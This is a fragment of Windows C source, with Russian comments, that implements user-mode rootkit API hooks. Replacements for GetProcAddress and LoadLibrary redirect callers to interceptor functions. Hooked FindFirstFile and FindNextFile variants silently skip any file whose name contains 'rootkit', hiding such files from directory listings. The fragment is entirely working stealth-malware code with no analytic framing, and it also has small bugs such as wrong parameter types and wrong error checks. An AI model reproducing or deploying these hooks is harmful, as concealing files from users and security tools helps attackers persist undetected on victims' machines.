//

//
//
//
FARPROC WINAPI myGetProcAddress(HMODULE hModule, LPCSTR lpProcName)
{
	FARPROC	iRC;
	INT		i;

	iRC = OldGetProcAddress(hModule, lpProcName);
	if (iRC != NULL)
	{
		for (i = 0; i < INTERCEPTED_FUNCTIONS_NO; i++)
		{
			if ((PVOID)iRC == InterceptedFunctionsList[i].OldFunction)
			{
				// Функция перехвачена, вернуть адрес функции-перехватчика
				iRC = (FARPROC)InterceptedFunctionsList[i].NewFunction;
				break;
			}
		}
	}

	return iRC;
}

//
//
//
HMODULE WINAPI myLoadLibraryA(LPCSTR lpLibFileName)
{
	HMODULE	iRC;
	BOOL	bLoaded;

	// Признак того, что DLL уже загружена
	bLoaded = (GetModuleHandleA(lpLibFileName) != INVALID_HANDLE_VALUE);

	iRC = OldLoadLibraryA(lpLibFileName);

	// Это загрузка новой DLL?
	if (iRC != INVALID_HANDLE_VALUE && !bLoaded)
	{
		InterceptModuleFunctions(iRC);
	}

	return iRC;
}


//
//
//
HMODULE WINAPI myLoadLibraryW(LPCWSTR lpLibFileName)
{
	HMODULE	iRC;
	BOOL	bLoaded;

	// Признак того, что DLL уже загружена
	bLoaded = (GetModuleHandleW(lpLibFileName) != INVALID_HANDLE_VALUE);

	iRC = OldLoadLibraryW(lpLibFileName);

	// Это загрузка новой DLL?
	if (iRC != INVALID_HANDLE_VALUE && !bLoaded)
	{
		InterceptModuleFunctions(iRC);
	}

	return iRC;
}


//
//
//
HANDLE WINAPI myFindFirstFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
	HANDLE	hRC;
	CHAR	szFileName[MAX_PATH];

	hRC = OldFindFirstFileA(hFindFile, lpFindFileData);
	// Успешный поиск?
	if (hRC != INVALID_HANDLE_VALUE)
	{
		strcpy(szFileName, lpFindFileData->cFileName);
		_strlwr(szFileName);
		if (strstr(szFileName, "rootkit") != NULL)
		{
			if (!(FindNextFileA(hRC, lpFindFileData)))
			{
				FindClose(hRC);
				hRC = INVALID_HANDLE_VALUE;
			}
		}
	}

	return hRC;
}


//
//
//
HANDLE WINAPI myFindFirstFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	HANDLE	hRC;
	WCHAR	szFileName[MAX_PATH];

	hRC = OldFindFirstFileW(hFindFile, lpFindFileData);
	// Успешный поиск?
	if (hRC != INVALID_HANDLE_VALUE)
	{
		wcscpy(szFileName, lpFindFileData->cFileName);
		_wcslwr(szFileName);
		if (wcsstr(szFileName, L"rootkit") != NULL)
		{
			if (!(FindNextFileW(hRC, lpFindFileData)))
			{
				FindClose(hRC);
				hRC = INVALID_HANDLE_VALUE;
			}
		}
	}

	return hRC;
}


//
//
//
BOOL WINAPI myFindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData)
{
	BOOL	bRC;
	CHAR	szFileName[MAX_PATH];

	bRC = OldFindNextFileA(hFindFile, lpFindFileData);
	while (bRC)
	{
		strcpy(szFileName, lpFindFileData->cFileName);
		_strlwr(szFileName);
		if (strstr(szFileName, "rootkit") == NULL)
			return bRC;

		bRC = OldFindNextFileA(hFindFile, lpFindFileData);
	}

	return bRC;
}


//
//
//
BOOL WINAPI myFindNextFileW(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData)
{
	BOOL	bRC;
	WCHAR	szFileName[MAX_PATH];

	bRC = OldFindNextFileW(hFindFile, lpFindFileData);
	while (bRC)
	{
		wcscpy(szFileName, lpFindFileData->cFileName);
		_wcslwr(szFileName);
		if (wcsstr(szFileName, L"rootkit") == NULL)
			return bRC;

		bRC = OldFindNextFileW(hFindFile, lpFindFileData);
	}

	return bRC;
}
